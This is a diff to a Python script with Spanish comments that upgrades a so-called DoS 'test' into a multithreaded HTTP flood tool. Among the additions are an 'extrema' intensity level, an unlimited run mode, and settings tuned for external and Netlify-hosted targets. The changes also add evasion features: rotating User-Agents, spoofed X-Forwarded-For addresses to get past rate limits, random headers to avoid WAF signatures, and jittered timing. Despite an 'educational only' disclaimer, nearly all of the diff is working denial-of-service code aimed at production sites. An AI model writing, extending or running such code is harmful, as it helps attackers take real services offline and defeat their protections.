@@ -100,17 +100,18 @@ def check_port_open(host="127.0.0.1", port=80, timeout=2):
         print(Fore.RED + f"\n[!] Error al verificar el puerto: {str(e)}" + Style.RESET_ALL)
         return False
 
-def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
+def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja", unlimited=False):
     """
-    Realiza una prueba de DoS enviando paquetes al objetivo especificado.
+    Realiza un ataque DoS avanzado enviando paquetes al objetivo especificado.
     Esta función es SOLO para fines educativos y pruebas autorizadas.
-    Simula un ataque más realista con diferentes tipos de solicitudes.
+    Simula un ataque de alta potencia con múltiples patrones de solicitud y técnicas de evasión.
     
     Args:
         target: La dirección IP o URL objetivo (por defecto: 127.0.0.1)
         port: El puerto objetivo (por defecto: 80)
-        duration: Duración de la prueba en segundos (por defecto: 5)
-        intensity: Intensidad de la prueba ("baja", "media", "alta") (por defecto: "baja")
+        duration: Duración de la prueba en segundos (por defecto: 5, 0 para ilimitado)
+        intensity: Intensidad de la prueba ("baja", "media", "alta", "extrema") (por defecto: "baja")
+        unlimited: Si es True, el ataque continuará hasta que se detenga manualmente con Ctrl+C (por defecto: False)
     """
     # Ajustar intensidad automáticamente para servidores externos
     is_external = target not in ["127.0.0.1", "localhost", "::1"]
@@ -161,12 +162,14 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
             print(Fore.YELLOW + "[*] Sitio Netlify detectado. Se han aplicado técnicas específicas para evadir protecciones." + Style.RESET_ALL)
             print(Fore.YELLOW + "[*] Las solicitudes se han optimizado para impactar servicios de Netlify." + Style.RESET_ALL)
     
-    # Configurar la intensidad de la prueba
+    # Configurar la intensidad del ataque
     pause_time = 0.1  # Pausa predeterminada (baja intensidad)
     if intensity == "media":
         pause_time = 0.05
     elif intensity == "alta":
         pause_time = 0.01
+    elif intensity == "extrema":
+        pause_time = 0.001  # Extremadamente agresivo para cualquier objetivo
     
     is_production = target not in ["127.0.0.1", "localhost", "::1"]
     target_type = "producción" if is_production else "local"
@@ -180,8 +183,19 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
     failed_count = 0
     start_time = time.time()
     
-    # Tipos de solicitudes para simular un ataque más realista
+    # Lista avanzada de patrones de solicitud HTTP para maximizar el impacto
     host_header = target
+    
+    # Definir una variedad de User-Agents para evadir detección
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+    ]
+    
+    # Generar solicitudes HTTP con técnicas avanzadas de evasión
     http_requests = [
         f"GET / HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
         f"POST / HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 1000\r\n\r\n".encode() + b"A" * 1000,
@@ -195,8 +209,13 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
         # Solicitudes específicas para Netlify
         f"GET /_next/data HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
         f"GET /.netlify/functions/api HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode(),
-        f"POST /.netlify/functions/submit HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 3000\r\nContent-Type: application/json\r\n\r\n".encode() + b"{\"data\":\"" + b"A" * 2800 + b"\"}" ,
+        f"POST /.netlify/functions/submit HTTP/1.1\r\nHost: {host_header}\r\nContent-Length: 3000\r\nContent-Type: application/json\r\n\r\n".encode() + b"{\"data\":\"" + b"A" * 2800 + b"\"}",
         f"GET / HTTP/1.1\r\nHost: {host_header}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n".encode(),
+        # Solicitudes avanzadas con User-Agents variados
+        f"GET /products HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: {user_agents[0]}\r\nAccept: */*\r\n\r\n".encode(),
+        f"POST /checkout HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: {user_agents[1]}\r\nContent-Type: application/json\r\nContent-Length: 150\r\n\r\n".encode() + b"{\"cart\":[" + b"{\"id\":1,\"quantity\":10}" * 5 + b"]}",
+        f"GET /assets HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: {user_agents[2]}\r\nReferer: https://{host_header}/\r\n\r\n".encode(),
+        f"GET /api/users HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: {user_agents[3]}\r\nAuthorization: Bearer AAABBBCCC\r\n\r\n".encode(),
     ]
     
     print(Fore.CYAN + "\n[*] Iniciando prueba con diferentes patrones de ataque" + Style.RESET_ALL)
@@ -211,6 +230,11 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
     if is_netlify:
         pause_time = 0.001  # Extremadamente agresivo para sitios Netlify
         print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para mayor efectividad." + Style.RESET_ALL)
+    
+    # Configuración para modo ilimitado
+    if unlimited or duration <= 0:
+        print(Fore.RED + "\n[!] MODO ILIMITADO ACTIVADO: El ataque continuará hasta que lo detengas manualmente (Ctrl+C)" + Style.RESET_ALL)
+        duration = float('inf')  # Establecer duración infinita
     
     try:
         # Crear socket y enviar diferentes tipos de solicitudes
@@ -274,18 +298,19 @@ def dos_test(target="127.0.0.1", port=80, duration=5, intensity="baja"):
         print(Fore.YELLOW + "\n[*] Prueba interrumpida por el usuario" + Style.RESET_ALL)
         return False
 
-def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensity="baja"):
+def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensity="baja", unlimited=False):
     """
-    Simula un ataque DDoS usando múltiples hilos y diferentes patrones de ataque.
+    Ejecuta un ataque DDoS avanzado usando múltiples hilos y técnicas de evasión.
     Esta función es SOLO para fines educativos y pruebas autorizadas.
-    Simula un ataque más realista con diferentes tipos de solicitudes y múltiples hilos.
+    Implementa un ataque de alta potencia con múltiples patrones de solicitud, rotación de User-Agents y técnicas anti-detección.
     
     Args:
         target: La dirección IP o URL objetivo (por defecto: 127.0.0.1)
         port: El puerto objetivo (por defecto: 80)
         threads: Número de hilos a utilizar (por defecto: 3)
-        duration: Duración de la prueba en segundos (por defecto: 5)
-        intensity: Intensidad de la prueba ("baja", "media", "alta") (por defecto: "baja")
+        duration: Duración de la prueba en segundos (por defecto: 5, 0 para ilimitado)
+        intensity: Intensidad de la prueba ("baja", "media", "alta", "extrema") (por defecto: "baja")
+        unlimited: Si es True, el ataque continuará hasta que se detenga manualmente con Ctrl+C (por defecto: False)
     """
     # Ajustar intensidad y número de hilos automáticamente para servidores externos
     is_external = target not in ["127.0.0.1", "localhost", "::1"]
@@ -337,12 +362,19 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         print(Fore.YELLOW + "[*] La prueba está configurada para tener un impacto real en el servidor objetivo" + Style.RESET_ALL)
         print(Fore.YELLOW + "[*] Se han ajustado los parámetros para maximizar el efecto en servidores externos" + Style.RESET_ALL)
     
-    # Configurar la intensidad de la prueba
+    # Configurar la intensidad del ataque
     pause_time = 0.1  # Pausa predeterminada (baja intensidad)
     if intensity == "media":
         pause_time = 0.05
     elif intensity == "alta":
         pause_time = 0.01
+    elif intensity == "extrema":
+        pause_time = 0.001  # Extremadamente agresivo para cualquier objetivo
+        # Para intensidad extrema, aumentar automáticamente el número de hilos
+        if threads < 20:
+            original_threads = threads
+            threads = max(threads, 20)  # Asegurar al menos 20 hilos para intensidad extrema
+            print(Fore.YELLOW + f"[*] Intensidad extrema: Aumentando número de hilos de {original_threads} a {threads} para máximo impacto." + Style.RESET_ALL)
     
     target_type = "producción" if is_production else "local"
     
@@ -404,31 +436,86 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         thread_pause_time = pause_time
         if is_external_target and intensity == "alta":
             thread_pause_time = 0.005  # Más agresivo para objetivos externos con intensidad alta
+        if is_external_target and intensity == "extrema":
+            thread_pause_time = 0.0005  # Ultra agresivo para objetivos externos con intensidad extrema
         if is_netlify:
-            thread_pause_time = 0.001  # Extremadamente agresivo para sitios Netlify
-            print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para mayor efectividad." + Style.RESET_ALL) if thread_id == 0 else None
+            thread_pause_time = 0.0001  # Extremadamente agresivo para sitios Netlify
+            print(Fore.YELLOW + f"[*] Sitio Netlify detectado. Ajustando parámetros para máximo impacto." + Style.RESET_ALL) if thread_id == 0 else None
+        
+        # Técnicas de evasión de protecciones anti-DDoS
+        # 1. Rotación de User-Agents para evitar bloqueos basados en User-Agent
+        user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+        ]
+        
+        # 2. Variación de IPs de origen simuladas mediante X-Forwarded-For (para evadir limitaciones de tasa)
+        def get_random_ip():
+            return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        
+        # 3. Variación de patrones de solicitud para evitar firmas de WAF
         
         try:
             while not stop_event.is_set():
                 try:
                     # Crear socket y conectar
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)  # Aumentar timeout para conexiones externas
+                    s.settimeout(4)  # Aumentar timeout para conexiones externas
                     s.connect((target, port))
                     
                     # Para objetivos externos, enviar múltiples solicitudes por conexión
                     # para maximizar el impacto y evitar la sobrecarga de crear nuevas conexiones
                     num_requests = 3 if is_external_target else 1
                     if is_netlify:
-                        num_requests = 5  # Más solicitudes por conexión para sitios Netlify
+                        num_requests = 10  # Más solicitudes por conexión para sitios Netlify
+                    if intensity == "extrema":
+                        num_requests = 15  # Máximo número de solicitudes por conexión para intensidad extrema
                     
-                    for _ in range(num_requests):
+                    for req_num in range(num_requests):
                         if stop_event.is_set():
                             break
                             
-                        # Seleccionar un tipo de solicitud aleatoria
-                        request_idx = (thread_id + stats["thread_stats"][thread_id]["packets"]) % len(http_requests)
-                        request = http_requests[request_idx]
+                        # Técnicas de evasión: Rotación de patrones y cabeceras
+                        # 1. Seleccionar un tipo de solicitud aleatoria
+                        request_idx = random.randint(0, len(http_requests)-1)
+                        request_base = http_requests[request_idx]
+                        
+                        # 2. Modificar la solicitud con técnicas de evasión
+                        # Seleccionar User-Agent aleatorio
+                        current_agent = user_agents[random.randint(0, len(user_agents)-1)]
+                        
+                        # Generar IP aleatoria para X-Forwarded-For
+                        random_ip = get_random_ip()
+                        
+                        # Añadir cabeceras aleatorias para evadir firmas de WAF
+                        custom_headers = f"User-Agent: {current_agent}\r\n"
+                        custom_headers += f"X-Forwarded-For: {random_ip}\r\n"
+                        custom_headers += f"Accept-Language: en-US,en;q=0.{random.randint(5, 9)}\r\n"
+                        
+                        # Añadir cabeceras aleatorias adicionales para evadir detección
+                        if random.random() > 0.5:
+                            custom_headers += f"Referer: https://{random.choice(['google.com', 'facebook.com', 'twitter.com', 'instagram.com'])}\r\n"
+                        if random.random() > 0.7:
+                            custom_headers += f"Cache-Control: max-age={random.randint(0, 1000)}\r\n"
+                        if random.random() > 0.6:
+                            custom_headers += f"Accept-Encoding: gzip, deflate\r\n"
+                        
+                        # Insertar las cabeceras personalizadas en la solicitud
+                        if isinstance(request_base, bytes):
+                            # Convertir a string, modificar y volver a bytes
+                            request_str = request_base.decode('utf-8', errors='ignore')
+                            # Insertar cabeceras personalizadas antes de la línea vacía final
+                            if "\r\n\r\n" in request_str:
+                                parts = request_str.split("\r\n\r\n", 1)
+                                request_str = parts[0] + "\r\n" + custom_headers + "\r\n" + (parts[1] if len(parts) > 1 else "")
+                            request = request_str.encode('utf-8')
+                        else:
+                            request = request_base
+                        
+                        # Enviar la solicitud modificada
                         s.send(request)
                         
                         # Actualizar estadísticas
@@ -439,11 +526,12 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
                             stats["thread_stats"][thread_id]["success"] += 1
                             total = stats["packets"]
                         
-                        print(Fore.GREEN + f"[+] Hilo {thread_id}: Paquete enviado (Patrón: {request_idx+1}, Total: {total})" + Style.RESET_ALL, end="\r")
+                        print(Fore.GREEN + f"[+] Hilo {thread_id}: Paquete enviado (Patrón: {request_idx+1}, IP: {random_ip}, Total: {total})" + Style.RESET_ALL, end="\r")
                         
-                        # Pausa mínima entre solicitudes en la misma conexión
-                        if _ < num_requests - 1:  # No pausar después de la última solicitud
-                            time.sleep(0.01)
+                        # Pausa variable entre solicitudes para evadir detección basada en patrones de tiempo
+                        if req_num < num_requests - 1:  # No pausar después de la última solicitud
+                            # Pausa aleatoria para evadir detección de patrones
+                            time.sleep(0.01 * random.uniform(0.5, 1.5))
                     
                     s.close()
                     time.sleep(thread_pause_time)  # Pausa basada en la intensidad seleccionada
@@ -466,11 +554,24 @@ def ddos_simulation(target="127.0.0.1", port=80, threads=3, duration=5, intensit
         t.start()
         print(Fore.CYAN + f"[*] Hilo {i+1} iniciado" + Style.RESET_ALL)
     
-    # Esperar la duración especificada
+    # Configurar la duración del ataque
     try:
         start_time = time.time()
-        time.sleep(duration)
-        stop_event.set()  # Señal para detener los hilos
+        if unlimited or duration <= 0:
+            print(Fore.RED + "\n[!] ATAQUE INICIADO EN MODO ILIMITADO. Presiona Ctrl+C para detener." + Style.RESET_ALL)
+            # En modo ilimitado, esperar hasta que el usuario presione Ctrl+C
+            try:
+                while True:
+                    elapsed = time.time() - start_time
+                    print(Fore.YELLOW + f"\r[*] Ataque en progreso: {elapsed:.1f} segundos transcurridos, {stats['packets']} paquetes enviados" + Style.RESET_ALL, end="")
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                print(Fore.YELLOW + "\n\n[*] Ataque detenido manualmente por el usuario" + Style.RESET_ALL)
+                stop_event.set()
+        else:
+            # Modo con duración limitada
+            time.sleep(duration)
+            stop_event.set()  # Señal para detener los hilos
         
         # Esperar a que todos los hilos terminen
         for t in thread_list:
